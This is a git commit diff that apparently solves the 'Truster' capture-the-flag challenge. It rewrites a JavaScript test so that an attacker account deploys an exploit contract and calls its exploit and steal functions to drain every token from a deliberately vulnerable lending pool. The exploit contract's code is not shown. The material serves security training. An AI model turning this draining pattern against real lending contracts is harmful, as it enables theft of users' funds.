d0a4a1a562d44d3d7d89519e1e4db6d1b7c21ae6
RiccardoBiosas <rbios@protonmail.com>
2021-12-28 11:00:07 +0100

    solved Truster challenge

--- test/truster/truster.challenge.js
+++ test/truster/truster.challenge.js
@@ -1,16 +1,16 @@
-const { ether } = require('@openzeppelin/test-helpers');
-const { accounts, contract } = require('@openzeppelin/test-environment');
+const { ether } = require("@openzeppelin/test-helpers");
+const { accounts, contract, web3 } = require("@openzeppelin/test-environment");
 
-const DamnValuableToken = contract.fromArtifact('DamnValuableToken');
-const TrusterLenderPool = contract.fromArtifact('TrusterLenderPool');
+const DamnValuableToken = contract.fromArtifact("DamnValuableToken");
+const TrusterLenderPool = contract.fromArtifact("TrusterLenderPool");
+const TrusterExploit = contract.fromArtifact("TrusterExploit");
 
-const { expect } = require('chai');
+const { expect } = require("chai");
 
-describe('[Challenge] Truster', function () {
+describe("[Challenge] Truster", function () {
+  const [deployer, attacker, ...otherAccounts] = accounts;
 
-    const [deployer, attacker, ...otherAccounts] = accounts;
-
-    const TOKENS_IN_POOL = ether('1000000');
+  const TOKENS_IN_POOL = ether("1000000");
 
     before(async function () {
         /** SETUP SCENARIO */
@@ -28,17 +28,35 @@ describe('[Challenge] Truster', function () {
         ).to.be.bignumber.equal('0');
     });
 
-    it('Exploit', async function () {
-        /** YOUR EXPLOIT GOES HERE */
+  it("Exploit", async function () {
+    // console.log(this.pool);
+    // attack in a single tx
+    console.log("this.token.address ", this.token.address);
+    this.exploit = await TrusterExploit.new(
+      this.token.address, 
+    {
+      from: attacker,
     });
+    const poolBalance = await this.token.balanceOf(this.pool.address);
+    console.log(`poolBalance `, poolBalance.toString());
+    await this.exploit.exploit(this.pool.address, {from: attacker});
+    this.exploit.steal(
+      this.pool.address,
+      {
+        from: attacker
+      }
+    )
+    const attackerBalanceAfter = this.token.balanceOf(attacker)
+    console.log(`attackerBalanceAfter: ${attackerBalanceAfter.toString()}`);
+  });
 
-    after(async function () {
-        /** SUCCESS CONDITIONS */
-        expect(
-            await this.token.balanceOf(attacker)
-        ).to.be.bignumber.equal(TOKENS_IN_POOL);        
-        expect(
-            await this.token.balanceOf(this.pool.address)
-        ).to.be.bignumber.equal('0');
-    });
+  after(async function () {
+    /** SUCCESS CONDITIONS */
+    expect(await this.token.balanceOf(attacker)).to.be.bignumber.equal(
+      TOKENS_IN_POOL
+    );
+    expect(await this.token.balanceOf(this.pool.address)).to.be.bignumber.equal(
+      "0"
+    );
+  });
 });
